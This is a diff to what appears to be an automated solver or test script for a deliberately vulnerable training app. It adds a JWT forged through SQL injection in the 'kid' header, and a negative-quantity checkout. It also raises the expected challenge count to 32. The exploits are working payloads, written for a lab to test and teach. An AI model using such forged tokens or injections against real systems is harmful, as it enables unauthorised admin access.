@@ -135,6 +135,20 @@ def main():
             )
             return response.json().get("flag")
 
+        def jwt_kid_injection():
+            forged = jwt.encode(
+                {"sub": student_id, "username": "student", "role": "admin"},
+                key="pwned-secret",
+                algorithm="HS256",
+                headers={"kid": "nope' UNION SELECT 'pwned-secret' -- "},
+            )
+            response = requests.get(
+                BASE + "/api/auth/me",
+                headers={"Authorization": "Bearer " + forged},
+                timeout=15,
+            )
+            return extract_flag(response.text)
+
         def sql_injection():
             response = requests.post(
                 BASE + "/api/auth/login",
@@ -219,6 +233,7 @@ def main():
 
         record("jwt-alg-none", jwt_alg_none, token)
         record("jwt-weak-secret", jwt_weak_secret, token)
+        record("jwt-kid-injection", jwt_kid_injection, token)
         record("sqli-auth-bypass", sql_injection, token)
         record("mass-assignment-role", mass_assignment, token)
         record("brute-force-login", brute_force, token)
@@ -348,9 +363,19 @@ def main():
             )
             return extract_flag(response.text)
 
+        def inventory_negative_quantity():
+            response = api_json(
+                "POST",
+                "/api/inventory/cart/checkout",
+                token=token,
+                json={"productId": 1, "quantity": -5},
+            )
+            return response.json().get("flag")
+
         record("inventory-idor", inventory_idor, token)
         record("inventory-race-condition", inventory_race, token)
         record("inventory-path-traversal", inventory_traversal, token)
+        record("inventory-negative-quantity", inventory_negative_quantity, token)
 
         def legacy_lfi():
             response = api_json(
@@ -467,12 +492,12 @@ def main():
         catalog = api_json(
             "GET", "/api/academy/challenges", token=token
         ).json()["challenges"]
-        if len(catalog) != 30:
-            RESULTS.append(("catalog", "FAIL", f"expected 30 challenges, got {len(catalog)}"))
+        if len(catalog) != 32:
+            RESULTS.append(("catalog", "FAIL", f"expected 32 challenges, got {len(catalog)}"))
 
         progress = api_json("GET", "/api/academy/progress", token=token).json()
-        if progress["solved"] != 30:
-            RESULTS.append(("progress", "FAIL", f"expected 30 solved, got {progress['solved']}"))
+        if progress["solved"] != 32:
+            RESULTS.append(("progress", "FAIL", f"expected 32 solved, got {progress['solved']}"))
 
         wrong = requests.post(
             BASE + "/api/academy/challenges/dom-xss/solve",
